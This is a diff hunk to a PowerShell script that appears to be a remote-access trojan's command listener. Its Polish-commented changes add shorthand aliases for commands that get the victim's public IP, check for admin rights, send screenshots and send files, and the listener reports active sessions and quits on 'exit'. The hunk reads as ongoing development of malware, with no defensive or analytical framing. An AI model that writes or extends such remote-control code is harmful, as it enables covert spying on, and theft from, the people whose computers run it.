@@ -152,6 +152,19 @@ function CommandListener {
                     $target = $parts[0]
                     $cmd    = if ($parts.Count -gt 1) { $parts[1] } else { '' }
 
+                    # Aliasy komend
+                    $aliases = @{
+                        'getip'   = 'GetPublicIP'
+                        'chadmin' = 'CheckAdminRights'
+                        'ss'      = 'SendScreenshot'
+                        'sf'      = 'SendFile'
+                    }
+                    $cmdFirst = ($cmd -split ' ', 2)[0].ToLower()
+                    if ($aliases.ContainsKey($cmdFirst)) {
+                        $rest = if (($cmd -split ' ', 2).Count -gt 1) { ' ' + ($cmd -split ' ', 2)[1] } else { '' }
+                        $cmd  = $aliases[$cmdFirst] + $rest
+                    }
+
                     if ($cmd -match '/online')         { SendMessage "Sesja aktywna" $cmd }
                     if ($target -notmatch $session_id) { continue }
                     if ($cmd -eq 'exit')               { SendMessage "Sesja zabita" $cmd; exit }
